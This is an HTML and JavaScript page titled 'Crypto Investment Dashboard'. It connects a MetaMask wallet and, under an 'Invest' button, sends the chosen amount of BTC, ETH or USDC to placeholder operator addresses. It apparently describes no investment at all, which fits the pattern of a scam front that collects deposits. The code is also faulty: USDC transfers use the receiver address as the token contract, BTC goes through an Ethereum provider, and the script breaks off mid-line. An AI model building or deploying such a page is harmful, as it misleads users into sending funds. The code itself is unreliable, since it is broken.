<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto Investment Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
  --bg-dark: #0A0E1A;
  --card-bg: #121827;
  --track-bg: #1E293B;
  --primary: #6366F1;
  --secondary: #A855F7;
  --accent: #38BDF8;
  --success: #22C55E;
  --text-main: #F8FAFC;
  --text-dim: #94A3B8;
}
body {
  margin:0;
  font-family:'Plus Jakarta Sans', sans-serif;
  background: var(--bg-dark);
  color: var(--text-main);
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}
.container {
  background: var(--card-bg);
  padding: 40px;
  border-radius:20px;
  width: 380px;
  box-shadow:0 20px 40px rgba(0,0,0,0.5);
}
h2 { text-align:center; margin-bottom:30px; font-weight:800; color: var(--accent); }
.input-group { margin-bottom:20px; }
label { display:block; font-size:13px; color: var(--text-dim); margin-bottom:6px; }
input[type=number] { width:100%; padding:12px 14px; border-radius:10px; border:1px solid var(--track-bg); background:#0A0E1A; color:white; font-size:14px; }
select { width:100%; padding:12px 14px; border-radius:10px; border:1px solid var(--track-bg); background:#0A0E1A; color:white; font-size:14px; }
.slider-container { position: relative; margin-bottom:30px; }
input[type=range] {
  width:100%;
  -webkit-appearance:none;
  background: var(--track-bg);
  height:12px;
  border-radius:6px;
  outline:none;
  margin:0;
}
input[type=range]::-webkit-slider-thumb {
  -webkit-appearance:none;
  appearance:none;
  width:24px;
  height:24px;
  border-radius:50%;
  background: linear-gradient(135deg, var(--primary), var(--secondary));
  cursor:pointer;
  box-shadow:0 2px 6px rgba(0,0,0,0.5);
  margin-top:-6px;
  position: relative;
  z-index: 2;
}
input[type=range]:active::-webkit-slider-thumb { transform: scale(1.1); }
.tooltip {
  position:absolute;
  top:-35px;
  left:0;
  background: var(--accent);
  padding:5px 10px;
  border-radius:6px;
  font-size:12px;
  color:white;
  white-space:nowrap;
  transform:translateX(-50%);
  pointer-events:none;
}
.value-usd { color: var(--primary); font-weight:700; margin-top:5px; text-align:center; font-size:14px; }
button {
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  font-weight:700;
  cursor:pointer;
  margin-top:15px;
  background: linear-gradient(135deg, var(--primary), var(--secondary));
  color:white;
}
button:disabled { background:#1E293B; cursor:not-allowed; }
.status { margin-top:20px; font-size:13px; text-align:center; color: var(--accent); }
</style>
</head>
<body>
<div class="container">
<h2>Crypto Investment</h2>
<div class="input-group">
<label>Select Token</label>
<select id="tokenSelect">
  <option value="BTC">BTC</option>
  <option value="ETH">ETH</option>
  <option value="USDC">USDC</option>
</select>
</div>
<div class="input-group">
<label>Amount</label>
<input type="number" id="amountInput" placeholder="0.00000000">
</div>
<div class="slider-container">
<input type="range" min="0" max="10000000" value="0" step="0.00000001" id="amountSlider">
<div class="tooltip" id="sliderTooltip">0</div>
</div>
<div class="value-usd" id="usdValue">$0.00</div>
<button id="connectBtn">Connect Wallet</button>
<button id="sendBtn" disabled>Invest</button>
<div class="status" id="statusText">Not connected</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
let provider=null, signer=null;
const tokenPrices={BTC:30000, ETH:1800, USDC:1};
const tokenDecimals={BTC:8, ETH:18, USDC:6};
const receiverAddresses={BTC:'YOUR_BTC_ADDRESS', ETH:'YOUR_ETH_ADDRESS', USDC:'YOUR_USDC_ADDRESS'};
const slider=document.getElementById('amountSlider');
const input=document.getElementById('amountInput');
const tooltip=document.getElementById('sliderTooltip');
const usdDisplay=document.getElementById('usdValue');
const tokenSelect=document.getElementById('tokenSelect');
const connectBtn=document.getElementById('connectBtn');
const sendBtn=document.getElementById('sendBtn');
const statusText=document.getElementById('statusText');
function formatDecimals(value,decimals){return Number(value).toFixed(decimals);}
function updateSliderValue(){
  let val=parseFloat(input.value)||0;
  if(val>parseFloat(slider.max)) val=slider.max;
  slider.value=val;
  tooltip.innerText=formatDecimals(val, tokenDecimals[tokenSelect.value])+' '+tokenSelect.value;
  updateUSD(val);
}
function updateInputValue(){
  let val=parseFloat(slider.value)||0;
  input.value=formatDecimals(val, tokenDecimals[tokenSelect.value]);
  tooltip.innerText=formatDecimals(val, tokenDecimals[tokenSelect.value])+' '+tokenSelect.value;
  updateUSD(val);
}
function updateUSD(val){
  const price=tokenPrices[tokenSelect.value];
  usdDisplay.innerText='$'+(val*price).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
  let percent=(val/slider.max)*100;
  if(percent<0) percent=0; if(percent>100) percent=100;
  tooltip.style.left=percent+'%';
}
input.addEventListener('input',updateSliderValue);
slider.addEventListener('input',updateInputValue);
tokenSelect.addEventListener('change',()=>{
  input.value=0;
  slider.value=0;
  updateUSD(0);
});
connectBtn.addEventListener('click',async()=>{
  if(typeof window.ethereum==='undefined'){
    alert('Please install MetaMask'); return;
  }
  provider=new ethers.providers.Web3Provider(window.ethereum);
  await provider.send('eth_requestAccounts',[]);
  signer=provider.getSigner();
  statusText.innerText='Wallet Connected';
  sendBtn.disabled=false;
});
sendBtn.addEventListener('click',async()=>{
  if(!signer) return;
  const token=tokenSelect.value;
  const val=parseFloat(input.value);
  const decimals=tokenDecimals[token];
  const amount=ethers.utils.parseUnits(val.toString(),decimals);
  statusText.innerText='Processing...';
  try{
    let tx;
    if(token==='USDC'){
      const contract=new ethers.Contract(receiverAddresses.USDC,["function transfer(address,uint256) returns(bool)"],signer);
      tx=await contract.transfer(receiverAddresses.USDC,amount,{gasLimit:150000});
      await tx.wait();
    } else {
      statusText.innerTex
